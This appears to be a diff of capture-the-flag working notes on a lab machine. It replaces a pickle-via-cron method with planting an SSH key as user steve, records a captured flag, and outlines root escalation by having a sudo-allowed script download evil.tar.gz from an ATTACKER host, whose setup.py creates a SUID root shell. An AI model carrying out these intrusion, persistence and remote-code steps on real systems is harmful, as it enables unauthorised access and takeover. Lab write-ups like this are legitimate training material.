@@ -150,12 +150,19 @@ downloaded_path = index.download(plugin_url, PLUGIN_DIR)
 - SUID bash gives euid=steve but NOT egid=steve. groups stays www-data.
 - cat user.txt → "Permission denied" (need steve GROUP, not just euid)
 
-## CORRECT approach for user flag
-- Use the PICKLE EXPLOIT to read the flag directly during steve's cron
-- The cron runs as REAL steve (uid=steve, gid=steve) — FULL access
-- Upload SFD with pickle: `cat /home/steve/user.txt > /tmp/userflag.txt; chmod 644 /tmp/userflag.txt`
-- Wait for cron (~49 min after boot), then read /tmp/userflag.txt
-- The SUID bash approach is a dead end for reading root:steve files
+## ACTUAL solution for user flag
+- SUID bash can't READ root:steve files (euid=steve but gid=www-data)
+- BUT SUID bash CAN WRITE to /home/steve/ (directory owned by steve)
+- **Plant SSH key**: `mkdir -p /home/steve/.ssh; echo "pubkey" > authorized_keys`
+- SSH in as REAL steve → full uid=1000 gid=1000 → read user.txt
+- **User flag: f4475262258f659a46edceceb7b65c66**
+
+## Root privesc
+- `sudo -l`: `(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *`
+- Script uses setuptools.package_index.PackageIndex().download() — arbitrary code exec
+- Host evil.tar.gz with setup.py containing os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")
+- Run: `sudo python3 /opt/font-tools/install_validator.py http://ATTACKER:8000/evil.tar.gz`
+- Box died before root flag. Need to redo on next spawn.
 
 ## Tooling lessons
 - /etc/hosts had 4 stale entries — caused most "box down" false alarms
